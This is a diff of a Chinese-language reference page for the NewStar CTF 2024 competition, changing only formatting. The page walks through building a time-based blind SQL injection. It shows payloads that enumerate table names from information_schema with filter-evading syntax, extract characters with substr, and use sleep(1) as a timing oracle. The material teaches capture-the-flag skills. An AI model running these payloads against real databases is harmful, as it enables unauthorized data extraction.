@@ -1,6 +1,7 @@
 ---
-titleTemplate: ':title | 参考文档 - NewStar CTF 2024'
+titleTemplate: ":title | 参考文档 - NewStar CTF 2024"
 ---
+
 <script setup>
 import Container from '@/components/docs/Container.vue'
 </script>
@@ -83,18 +84,18 @@ import Container from '@/components/docs/Container.vue'
 
 1. 写一个 SQL 语句，能够查出所有的表名，并且合在一行
 
-    ```sql
-    (select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))
-    ```
+   ```sql
+   (select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))
+   ```
 
 2. 写一个 SQL 语句，返回一个字符串的第 i 个字符 `(select substr(%s,i,1))`，其中 `%s` 替换为你需要的字符串，比如和上面写出来的表名合在一起:
 
-    ```sql
-    (select substr(
-      (Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database()))),
-      i,1
-    ))
-    ```
+   ```sql
+   (select substr(
+     (Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database()))),
+     i,1
+   ))
+   ```
 
 3. 写一个 SQL 语句，判断一个字符的 ASCII 值是否等于某个值：`select (ascii ( %c ) =%d )`
 
@@ -104,13 +105,13 @@ import Container from '@/components/docs/Container.vue'
 
    当表名字符串的第 i 个字符的 ASCII 值等于 %d 的时候，程序延时 1 秒
 
-    ```sql
-    if ((ascii(
-      substr(
-        (Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database()))),
-      i,1)
-    )=%d),sleep(1),0)
-    ```
+   ```sql
+   if ((ascii(
+     substr(
+       (Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database()))),
+     i,1)
+   )=%d),sleep(1),0)
+   ```
 
    希望选手编写脚本，以避免每次尝试都需要进行上述繁琐的过程。
 
